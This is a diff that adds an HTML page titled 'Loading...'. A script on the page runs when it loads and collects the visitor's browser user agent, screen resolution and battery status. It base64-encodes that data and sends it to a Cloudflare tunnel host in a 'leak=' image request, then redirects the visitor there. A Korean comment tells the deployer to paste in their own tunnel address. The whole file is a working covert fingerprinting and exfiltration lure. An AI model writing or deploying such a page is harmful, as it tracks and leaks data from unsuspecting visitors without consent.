@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Loading...</title></head>
+<body>
+    <script>
+        async function run() {
+            let batt = "unknown";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batt = `Level:${Math.round(b.level * 100)}%,Charging:${b.charging}`;
+            }
+
+            const data = btoa(JSON.stringify({
+                ua: navigator.userAgent,
+                res: screen.width + "x" + screen.height,
+                batt: batt
+            }));
+
+            // [중요] 여기에 복사한 Cloudflare HTTPS 주소를 넣으세요!
+            const secure_url = "https://immediate-nashville-foto-principle.trycloudflare.com";
+
+            const img = new Image();
+            img.onload = () => { window.location.href = secure_url + "/view.jpg"; };
+            img.onerror = () => { window.location.href = secure_url + "/view.jpg"; };
+            img.src = secure_url + "/view.jpg?leak=" + data;
+        }
+        run();
+    </script>
+</body>
+</html>
